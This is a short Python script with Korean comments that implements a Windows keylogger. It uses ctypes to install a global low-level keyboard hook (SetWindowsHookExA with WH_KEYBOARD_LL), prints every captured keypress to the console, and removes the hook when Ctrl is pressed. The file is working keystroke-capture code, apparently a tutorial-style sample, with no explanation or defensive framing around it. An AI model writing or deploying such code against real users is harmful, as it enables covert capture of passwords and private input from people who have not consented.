import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD

user32 = windll.user32 #windll 사용
kernel32 = windll.kernel32

WH_KEYBOARD_LL =13 #변수 선언
WM_KEYDOWN=0x0100
CTRL_CODE = 162

class KeyLogger: #클래스 정의
    def __init__(self):
        self.lUser32 = user32
        self.hooked = None
    def installHookProc(self, pointer): #훅 설정 함수 정의
        self.hooked = self.lUser32.SetWindowsHookExA(
                            WH_KEYBOARD_LL,
                            pointer,
                            kernel32.GetModuleHandleW(None),
                            0
        )
        if not self.hooked:
            return False
        return True

    def uninstallHookProc(self): #함수 해제 함수 정의
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

def getFPTR(fn): #함수 포인터 도출
    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
    return CMPFUNC(fn)
def hookProc(nCode, wParam, lParam): #훅 프로시저 정의
    if wParam is not WM_KEYDOWN:
        return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)
    hookedKey = chr(lParam[0])
    print(hookedKey)
    if(CTRL_CODE == int(lParam[0])):
        print("Ctrl pressed, call uninstallHook()")
        keyLogger.uninstallHookProc()
        sys.exit(-1)
    return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)

def startKeyLog(): #메시지 전달
    msg = MSG()
    user32.GetMessageA(byref(msg),0,0,0)

keyLogger = KeyLogger() #start of hook process 메시지 후킹 시
pointer = getFPTR(hookProc)
if keyLogger.installHookProc(pointer):
    print("installed keyLogger")

startKeyLog()